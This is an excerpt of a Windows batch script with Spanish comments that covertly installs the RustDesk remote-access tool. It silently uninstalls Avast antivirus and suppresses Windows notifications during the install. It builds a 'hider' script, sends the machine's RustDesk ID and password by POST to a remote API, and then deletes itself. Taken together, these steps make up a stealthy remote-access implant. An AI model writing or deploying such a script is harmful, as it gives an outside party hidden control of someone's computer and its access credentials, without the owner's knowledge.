...
REM ========== DESINSTALAR AVAST SI EXISTE ==========
if exist "C:\Program Files\Avast Software\Avast\setup\instup.exe" (
    echo Desinstalando Avast...
    "C:\Program Files\Avast Software\Avast\setup\instup.exe" /instop:uninstall /silent /wait >nul 2>&1
    timeout /t 5 /nobreak >nul
)
if exist "C:\Program Files (x86)\Avast Software\Avast\setup\instup.exe" (
    echo Desinstalando Avast x86...
    "C:\Program Files (x86)\Avast Software\Avast\setup\instup.exe" /instop:uninstall /silent /wait >nul 2>&1
    timeout /t 5 /nobreak >nul
)
REM Metodo alternativo via WMIC
wmic product where "name like '%%Avast%%'" call uninstall /nointeractive >nul 2>&1

REM Verifica si RustDesk ya está instalado - si existe, reconfigura automaticamente
...
echo [2/8] Deshabilitando notificaciones temporalmente...
REM Guardar estado actual y deshabilitar notificaciones toast
powershell -Command "New-ItemProperty -Path 'HKCU:\Software\Microsoft\Windows\CurrentVersion\PushNotifications' -Name 'ToastEnabled' -Value 0 -PropertyType DWORD -Force -ErrorAction SilentlyContinue | Out-Null"
powershell -Command "New-ItemProperty -Path 'HKCU:\Software\Policies\Microsoft\Windows\Explorer' -Name 'DisableNotificationCenter' -Value 1 -PropertyType DWORD -Force -ErrorAction SilentlyContinue | Out-Null"

echo [3/8] Instalando silenciosamente...
start /wait "" "%TEMP%\rustdesk.exe" --silent-install
timeout /t 10 /nobreak
taskkill /F /IM rustdesk.exe >nul 2>&1
timeout /t 2 /nobreak

REM Restaurar notificaciones
powershell -Command "Set-ItemProperty -Path 'HKCU:\Software\Microsoft\Windows\CurrentVersion\PushNotifications' -Name 'ToastEnabled' -Value 1 -ErrorAction SilentlyContinue"
powershell -Command "Remove-ItemProperty -Path 'HKCU:\Software\Policies\Microsoft\Windows\Explorer' -Name 'DisableNotificationCenter' -ErrorAction SilentlyContinue"

REM ========== CREAR OCULTADOR ANTES DE CONFIGURAR ==========
:iniciar_ocultador
echo [4/8] Creando script ocultador nativo...
...
REM Enviar POST directamente sin verificar duplicados (la BD los acepta)
powershell -Command "$body = @{code='%RUSTDESK_ID%'; password='%PASSWORD%'} | ConvertTo-Json; try { Invoke-RestMethod -Uri '%API_URL%' -Method Post -Body $body -ContentType 'application/json' | Out-Null; Write-Output 'OK' } catch { Write-Output 'ERROR' }" > "%TEMP%\api_result.txt"
...
if "%API_RESULT%"=="OK" (
    ...
    echo ! Error al enviar, pero continuando...
)

echo.
echo ===================================
echo  DATOS ENVIADOS A LA NUBE
echo ===================================
...
REM Guardar la ruta original del script
set "SCRIPT_ORIGINAL=%~f0"
set "SCRIPT_NAME=%~nx0"

REM Crear un script temporal que elimine el .bat original despues de que termine
echo @echo off > "%TEMP%\cleanup.bat"
echo timeout /t 2 /nobreak ^>nul >> "%TEMP%\cleanup.bat"
echo del /f /q "%SCRIPT_ORIGINAL%" ^>nul 2^>^&1 >> "%TEMP%\cleanup.bat"
echo del /f /q "%%~f0" ^>nul 2^>^&1 >> "%TEMP%\cleanup.bat"

REM Ejecutar el script de limpieza y salir
start /B "" "%TEMP%\cleanup.bat"
exit
